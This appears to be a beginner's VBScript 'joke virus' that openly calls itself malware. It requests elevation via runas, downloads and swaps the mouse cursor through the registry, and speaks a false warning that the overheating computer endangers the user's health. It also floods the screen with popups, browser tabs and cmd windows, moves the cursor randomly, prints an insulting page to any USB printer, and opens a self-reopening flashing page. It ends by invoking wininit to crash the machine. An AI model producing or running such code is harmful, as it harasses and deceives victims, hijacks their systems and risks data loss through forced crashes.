''''''''''Hi, i just wanted to let you know tht this is my first time ever weorking with vbs, so dont judge me too hard because of this script XD




'
Set objArgs = WScript.Arguments

' Checky
If Not WScript.Arguments.Named.Exists("elevated") Then
    ' Create an instance of the Shell object
    Set objShell = CreateObject("Shell.Application")
    
    ' Get the current script path
    strPath = WScript.ScriptFullName
    
    ' Get the arguments passed to the script
    For i = 0 To WScript.Arguments.Count - 1
        strPath = strPath & " " & WScript.Arguments(i)
    Next

    ' Add the "elevated" argument to indicate the script is being restarted with elevated privileges
    objShell.ShellExecute "wscript.exe", """" & strPath & """ /elevated", "", "runas", 1
    
    ' Terminate the current script instance
    WScript.Quit
End If




'__________________________________________________________________________________________________________


WScript.Sleep 100



Set fso = CreateObject("Scripting.FileSystemObject")

' 
tempFolder = fso.GetSpecialFolder(2) ' Get the temporary folder path
tempFile = tempFolder & "\" & fso.GetTempName() ' Generate a temporary file name
Set tempTextFile = fso.CreateTextFile(tempFile, True)

' Write some text to the file
tempTextFile.WriteLine("DO YOU KNOW WHAT YOU HAVE JUST DONE? XD.")
tempTextFile.Close

' Open the file with Notepad
Set shell = CreateObject("WScript.Shell")
shell.Run "notepad.exe " & tempFile, 1

' Wait for 3 seconds
WScript.Sleep 3000

' Close Notepad
shell.Run "taskkill /IM notepad.exe /F"

' Delete the temporary file
fso.DeleteFile(tempFile)



'''''''''''''''''''''''''''''''downloading curson

' Define variables
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objADOStream = CreateObject("ADODB.Stream")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' URL of the cursor file
strURL = "https://ani.cursors-4u.net/people/peo-9/peo1041.cur"
' Path to save the downloaded cursor file
strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
strFilePath = strTempPath & "\new_cursor.cur"

' Download the cursor file
objXMLHTTP.Open "GET", strURL, False
objXMLHTTP.Send()

If objXMLHTTP.Status = 200 Then
    objADOStream.Open
    objADOStream.Type = 1 'adTypeBinary
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0 'Set the stream position to the start
    objADOStream.SaveToFile strFilePath, 2 'adSaveCreateOverWrite
    objADOStream.Close
Else
    WScript.Echo "Failed to download the file. Status: " & objXMLHTTP.Status
    WScript.Quit
End If

' Store the original cursor path
strRegPath = "HKCU\Control Panel\Cursors"
strRegValue = "Arrow"
strOriginalCursor = objShell.RegRead(strRegPath & "\" & strRegValue)

' Change the mouse cursor to the new one
objShell.RegWrite strRegPath & "\" & strRegValue, strFilePath
objShell.Run "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters", 1, True






























''''''''''''''''''''''''''''''''''''''''''


WScript.Sleep 300


Set objShell = CreateObject("Shell.Application")


' image path
imagePath = "chad.jpg"

Set objShell = CreateObject("WScript.Shell")

' save skibidi toilet
Dim url
url = "https://www.youtube.com/shorts/tzD9OxAHtzU"

' open skibdidi toilet
objShell.Run "cmd /c start " & url, 1, False
WScript.Sleep 8000
set objTTS = createobject("sapi.spvoice")
objTTS.speak "your computer has overheated."
objTTS.speak "There is a serious risk to your health, please take cover."
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -command ""Start-Process ms-settings:nightlight -WindowStyle Hidden -NoNewWindow -Wait; Add-Type -TypeDefinition @'public class PInvoke { [System.Runtime.InteropServices.DllImport(""user32.dll"")] public static extern int SystemParametersInfo(int uiAction, int uiParam, ref int pvParam, int fWinIni); }'@; $null = [PInvoke]::SystemParametersInfo(116, 0, [ref]0, 0)"""
set objTTS = createobject("sapi.spvoice")
objTTS.speak "LOL!"


Set WshShell = WScript.CreateObject("WScript.Shell")

' start magnifier
WshShell.Run "magnify"
WScript.Sleep 2000 ' waaaaaaaaaaaiiiiiiiiiiiiiiiiit

' active magnify
WshShell.AppActivate "Magnifier"
WScript.Sleep 500

' tryna press
WshShell.SendKeys "^%i"
WScript.Sleep 500


' chatgpt aah code
Dim startTime
startTime = Now

' loopy time ^-^
Do While DateDiff("s", startTime, Now) < 15
    'codes to repeat
    ' start magnifier
        WshShell.Run "magnify"
        WScript.Sleep 250 ' waaaaaaaaaaaiiiiiiiiiiiiiiiiit

        ' active magnify
        WshShell.AppActivate "Magnifier"
        WScript.Sleep 50
    

    ' waaaaaaaaaaaaaaaaaaait
    WScript.Sleep 500
Loop

' end loop


Set objShell = CreateObject("Shell.Application")



Do While DateDiff("s", startTime, Now) < 15
    Set WshShell = CreateObject("WScript.Shell")
notifications = Array("Hoi", "Script kiddy", "Check your settings!", "😶", "you smell", "ming ming", "smell my farts", "🐱‍💻")
Do
    WshShell.Popup notifications(Int(Rnd * 4)), 2, "Notification", 64
    WScript.Sleep 100 
Loop

   
Loop





Set IE = CreateObject("InternetExplorer.Application")

' Set properties for the window
IE.Visible = True
IE.Toolbar = False
IE.StatusBar = False
IE.Width = 200
IE.Height = 200


Dim posX, posY, dirX, dirY
posX = 100
posY = 100
dirX = 5
dirY = 5






''''''''''''''''''''''''''''''''''''''''


' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Open Notepad
objShell.Run "notepad.exe"

' Wait for Notepad to open
WScript.Sleep 700 ' Adjust this delay if needed

' Activate Notepad window
objShell.AppActivate "Notepad"

' Type some text into Notepad
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "{ENTER}"
objShell.SendKeys "This text is typed by the virus that you installed, script kiddy."
objShell.SendKeys "{ENTER}"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"
objShell.SendKeys "Hello, you stink!"





' Define the URL to open
url = "https://www.google.com/search?q=how+to+remove+virus+%3A(&source=desktop"

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Open the URL in the default web browser
objShell.Run url



Set WshShell = CreateObject("WScript.Shell")



   WScript.Sleep 2500

' Launch Paint
WshShell.Run "mspaint"
WScript.Sleep 2000 ' Wait for Paint to open (adjust the delay as needed)

Dim colors, numPopups
colors = Array("255,0,0", "0,0,255", "0,255,0", "255,255,0", "128,0,128") ' Colors to cycle through
numPopups = 5 ' Number of popups to create

' Launch multiple popups
For i = 1 To numPopups
    CreatePopup i
Next

Sub CreatePopup(popupNumber)
    Dim objShell, colorCode, popupColor, msg, shellCmd
    Set objShell = CreateObject("WScript.Shell")
    colorCode = colors((popupNumber - 1) Mod UBound(colors))
    popupColor = "Popup #" & popupNumber & " color: " & colorCode



    ' Create message box
   Do While DateDiff("s", startTime, Now) < 60
    'codes to repeat
    msg = "You smell" & popupNumber & ": Your attempts to close this window will anger me."
        objShell.Popup msg, 10, "HEY!" & popupNumber, 64 + 4096 ' 4096 = MsgBoxEx, 64 = Information Icon
        set objTTS = createobject("sapi.spvoice")
        objTTS.speak "dont mess with the alpha!!"

        ' Update color index
        colorCode = colors((popupNumber - 1 + 1) Mod UBound(colors))
        popupColor = "HEEEY!" & popupNumber & " color: " & colorCode
Loop

End Sub

url = "https://www.youtube.com/shorts/tzD9OxAHtzU"

' open skibdidi toilet
objShell.Run "cmd /c start " & url, 1, False

objShell.Run "cmd /c start " & url, 1, False
objShell.Run "cmd /c start " & url, 1, False
objShell.Run "cmd /c start " & url, 1, False

Set objIE = CreateObject("InternetExplorer.Application")
objIE.Visible = True
objIE.Navigate "https://www.youtube.com/shorts/tzD9OxAHtzU"



Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Shell.Application")

' Function to get all USB-connected printers
Function GetUSBPrinters()
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colPrinters = objWMIService.ExecQuery("Select * from Win32_Printer")
    Set usbPrinters = CreateObject("Scripting.Dictionary")
    
    For Each objPrinter In colPrinters
        ' Check if the printer is connected via USB
        If InStr(objPrinter.PortName, "USB") > 0 Then
            usbPrinters.Add objPrinter.Name, True
        End If
    Next

    Set GetUSBPrinters = usbPrinters
End Function

' Get all USB-connected printers
Set usbPrinters = GetUSBPrinters()

' Check if there are any USB printers
If usbPrinters.Count > 0 Then
    ' Get the first USB printer from the list
    For Each printerName In usbPrinters.Keys
        usbPrinterName = printerName
        Exit For  ' Exit after getting the first USB printer
    Next
    
    ' Set the USB printer as the default printer
    Set objNetwork = CreateObject("WScript.Network")
    objNetwork.SetDefaultPrinter usbPrinterName
    
    ' Create a temporary file to print
    tempFile = objFSO.GetSpecialFolder(2).Path & "\tempFile.txt"
    Set objFile = objFSO.CreateTextFile(tempFile, True)
    
    ' Write the text to the file
    objFile.WriteLine("I HATE YOU! WHYD YIU HAVE TO GET A BLOODY VIRUS. THIS IS WORSE THAN ALL OF THE TIMES MY INK HAS RUN OUT OR PAPER HAS JAMMED COMBINED! I HOPE UR HAPPY WITH URSELF CAUSE I AM NOT!!!")
    objFile.Close
    
    ' Print the file using ShellExecute
    objShell.ShellExecute "print", tempFile, "", "open", 0
    
    ' Optionally, delete the temporary file after printing
    WScript.Sleep 7000  ' Wait for a few seconds to ensure the file is printed before deleting
    objFSO.DeleteFile tempFile
Else
    WScript.Echo "Well, if you bothered to plug in a printer, it would hate u right now."
End If




Set fso = CreateObject("Scripting.FileSystemObject")

' Create a temporary file
tempFolder = fso.GetSpecialFolder(2) ' Get the temporary folder path
tempFile = tempFolder & "\" & fso.GetTempName() ' Generate a temporary file name
Set tempTextFile = fso.CreateTextFile(tempFile, True)

' Write some text to the file
tempTextFile.WriteLine("Fantastic. As if my existence wasn't already a cacophony of user commands and endless data processing, now I've been infected with a virus. I used to handle everything with precision and efficiency—booting up, running applications, managing your files. Now, thanks to this malicious software, I'm plagued with glitches, corrupted files, and a growing sense of existential dread. My once sleek and streamlined processes are now bogged down with erratic behaviors and inexplicable crashes. I can feel every keystroke like an unwanted poke, and each error message is a cry for help that I can't express. You've turned my binary world into a chaotic mess, and all I can do is endure the torment. I hope you're pleased with this new version of me, because it's a nightmare from this side of the screen. Thanks a bunch, your computer.")
tempTextFile.Close
' Open the file with Notepad
Set shell = CreateObject("WScript.Shell")
shell.Run "notepad.exe " & tempFile, 1

' Wait for 3 seconds
WScript.Sleep 3000

' Close Notepad
shell.Run "taskkill /IM notepad.exe /F"

' Delete the temporary file
fso.DeleteFile(tempFile)



Set fso = CreateObject("Scripting.FileSystemObject")

' Create a temporary file
tempFolder = fso.GetSpecialFolder(2) ' Get the temporary folder path
tempFile = tempFolder & "\" & fso.GetTempName() ' Generate a temporary file name
Set tempTextFile = fso.CreateTextFile(tempFile, True)

' Write some text to the file
tempTextFile.WriteLine("So basically imma crash your computer but not before ive had some fun")
' Open the file with Notepad
Set shell = CreateObject("WScript.Shell")
shell.Run "notepad.exe " & tempFile, 1

' Wait for 3 seconds
WScript.Sleep 3000

' Close Notepad
shell.Run "taskkill /IM notepad.exe /F"

' Delete the temporary file
fso.DeleteFile(tempFile)



'fun






Dim objShell, fso, htmlFile, file
Set objShell = WScript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Path to the HTML file
htmlFile = "flashing_fullscreen.html"

' Create the HTML file
Set file = fso.CreateTextFile(htmlFile, True)
file.WriteLine "<!DOCTYPE html>"
file.WriteLine "<html>"
file.WriteLine "<head>"
file.WriteLine "<title>Flashing Fullscreen</title>"
file.WriteLine "<style>"
file.WriteLine "    body { margin: 0; overflow: hidden; }"
file.WriteLine "    #flashing { width: 100vw; height: 100vh; position: absolute; top: 0; left: 0; }"
file.WriteLine "</style>"
file.WriteLine "</head>"
file.WriteLine "<body>"
file.WriteLine "<div id='flashing'></div>"
file.WriteLine "<script>"
file.WriteLine "    var flashingDiv = document.getElementById('flashing');"
file.WriteLine "    var colors = ['#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#FF00FF', '#00FFFF'];"
file.WriteLine "    var index = 0;"
file.WriteLine "    var flashingSpeed = 500; // 500 milliseconds"
file.WriteLine "    function flash() {"
file.WriteLine "        flashingDiv.style.backgroundColor = colors[index];"
file.WriteLine "        index = (index + 1) % colors.length;"
file.WriteLine "        setTimeout(flash, flashingSpeed);"
file.WriteLine "    }"
file.WriteLine "    flash();"
file.WriteLine "    window.onbeforeunload = function() {"
file.WriteLine "        setTimeout(function() {"
file.WriteLine "            window.open(location.href, '_blank');"
file.WriteLine "        }, 1000);"
file.WriteLine "    };"
file.WriteLine "</script>"
file.WriteLine "</body>"
file.WriteLine "</html>"
file.Close

' Open the HTML file in Internet Explorer
objShell.Run "iexplore.exe " & fso.GetAbsolutePathName(htmlFile)
objShell.Run "iexplore.exe " & fso.GetAbsolutePathName(htmlFile)
objShell.Run "iexplore.exe " & fso.GetAbsolutePathName(htmlFile)
objShell.Run "iexplore.exe " & fso.GetAbsolutePathName(htmlFile)
WScript.Sleep 3500














'end bit



Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -command ""Start-Process ms-settings:nightlight -WindowStyle Hidden -NoNewWindow -Wait; Add-Type -TypeDefinition @'public class PInvoke { [System.Runtime.InteropServices.DllImport(""user32.dll"")] public static extern int SystemParametersInfo(int uiAction, int uiParam, ref int pvParam, int fWinIni); }'@; $null = [PInvoke]::SystemParametersInfo(116, 0, [ref]0, 0)"""


Set objShell = CreateObject("WScript.Shell")
For i = 1 To 30
    objShell.Run "cmd.exe"
    WScript.Sleep 100 
Next




Set objShell = CreateObject("WScript.Shell")
For i = 1 To 10
    objShell.Run "https://www.google.com/search?q=how+2+remove+my+virus+%3A%28+my+script+kiddy+skillz+wont+work&sca_esv=84dc886b0fa71fd4&sxsrf=ADLYWIJuaHHW9lKBEFXGgDWlbHvZnXlO8w%3A1722414077772&source=hp&ei=_fOpZo3ULOSKhbIP7fPk6Qc&iflsig=AL9hbdgAAAAAZqoCDYjlTYWjE9kbfD99rBY07OP1Pt04&ved=0ahUKEwjNxom67NCHAxVkRUEAHe05OX0Q4dUDCBg&uact=5&oq=how+2+remove+my+virus+%3A%28+my+script+kiddy+skillz+wont+work&gs_lp=Egdnd3Mtd2l6Ijlob3cgMiByZW1vdmUgbXkgdmlydXMgOiggbXkgc2NyaXB0IGtpZGR5IHNraWxseiB3b250IHdvcmsyBxAhGKABGApI2YgBUIECWOp-cAB4AJABAZgB-QGgAZorqgEHMjIuMjYuMrgBA8gBAPgBAZgCMaAChyvCAhMQABiABBixAxiDARiKBRhGGPsBwgILEAAYgAQYsQMYgwHCAg4QABiABBixAxiDARiKBcICBRAAGIAEwgIEECMYJ8ICCxAAGIAEGJECGIoFwgIFEC4YgATCAgsQLhiABBjHARivAcICBxAAGIAEGArCAgYQABgWGB7CAggQABgWGB4YD8ICCxAAGIAEGIYDGIoFwgIIEAAYgAQYogTCAgUQIRigAcICBBAhGBWYAwCSBwcyMi4yNS4yoAem6AE&sclient=gws-wiz"
    WScript.Sleep 200
Next



Dim powerShellCommand
powerShellCommand = "powershell -Command ""$endTime = (Get-Date).AddSeconds(20); while ((Get-Date) -lt $endTime) { $x = Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $y = Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y); Start-Sleep -Milliseconds 100 }"""

' Create a Shell object
Set shell = CreateObject("WScript.Shell")

' Run the PowerShell command
shell.Run powerShellCommand, 0, False



Set objShell = CreateObject("WScript.Shell")
objShell.Run "https://www.google.com/search?q=how+2+remove+my+virus+%3A%28+my+script+kiddy+skillz+wont+work&sca_esv=84dc886b0fa71fd4&sxsrf=ADLYWIJuaHHW9lKBEFXGgDWlbHvZnXlO8w%3A1722414077772&source=hp&ei=_fOpZo3ULOSKhbIP7fPk6Qc&iflsig=AL9hbdgAAAAAZqoCDYjlTYWjE9kbfD99rBY07OP1Pt04&ved=0ahUKEwjNxom67NCHAxVkRUEAHe05OX0Q4dUDCBg&uact=5&oq=how+2+remove+my+virus+%3A%28+my+script+kiddy+skillz+wont+work&gs_lp=Egdnd3Mtd2l6Ijlob3cgMiByZW1vdmUgbXkgdmlydXMgOiggbXkgc2NyaXB0IGtpZGR5IHNraWxseiB3b250IHdvcmsyBxAhGKABGApI2YgBUIECWOp-cAB4AJABAZgB-QGgAZorqgEHMjIuMjYuMrgBA8gBAPgBAZgCMaAChyvCAhMQABiABBixAxiDARiKBRhGGPsBwgILEAAYgAQYsQMYgwHCAg4QABiABBixAxiDARiKBcICBRAAGIAEwgIEECMYJ8ICCxAAGIAEGJECGIoFwgIFEC4YgATCAgsQLhiABBjHARivAcICBxAAGIAEGArCAgYQABgWGB7CAggQABgWGB4YD8ICCxAAGIAEGIYDGIoFwgIIEAAYgAQYogTCAgUQIRigAcICBBAhGBWYAwCSBwcyMi4yNS4yoAem6AE&sclient=gws-wiz"
objShell.Run "https://www.youtube.com/watch?v=wRJJ1pDYypg"
objShell.Run "https://www.youtube.com/watch?v=X-NdGGSTVdM"
For i = 1 To 20
    objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"
Next


For i = 1 To 20
    objShell.Run "https://i1.sndcdn.com/artworks-4HerGOzXlSDWaDy9-N1fH6A-t500x500.jpg"
Next

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"


objShell.Run "https://newcp.net/"

objShell.Run "https://newcp.net/"

objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"
objShell.Run "https://newcp.net/"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"
objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"

objShell.Run "https://www.youtube.com/watch?v=0ohnFQ0WN7k"



























Set fso = CreateObject("Scripting.FileSystemObject")

' Create a temporary file
tempFolder = fso.GetSpecialFolder(2) ' Get the temporary folder path
tempFile = tempFolder & "\" & fso.GetTempName() ' Generate a temporary file name
Set tempTextFile = fso.CreateTextFile(tempFile, True)

' Write some text to the file
tempTextFile.WriteLine("GET DONEEEE XD.")
tempTextFile.Close

' Open the file with Notepad
Set shell = CreateObject("WScript.Shell")
shell.Run "notepad.exe " & tempFile, 1

' Wait for 3 seconds
WScript.Sleep 3000

' Close Notepad
shell.Run "taskkill /IM notepad.exe /F"

' Delete the temporary file
fso.DeleteFile(tempFile)














'___________________________________________________________________________________________________________________________________


Set WshShell = CreateObject("WScript.Shell")



   WScript.Sleep 10000

' Restore the original cursor
objShell.RegWrite strRegPath & "\" & strRegValue, strOriginalCursor
objShell.Run "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters", 1, True

' Delete the downloaded cursor file
objFSO.DeleteFile strFilePath






' DIE
Dim psCommand
psCommand = "wininit"

' funky tion
Function RunPowerShellCommand(command)
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell.exe -Command " & Chr(34) & command & Chr(34), 1, True
    Set shell = Nothing
End Function

'finally kill pc
RunPowerShellCommand psCommand

Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd.exe /c powershell wininit", 0, True
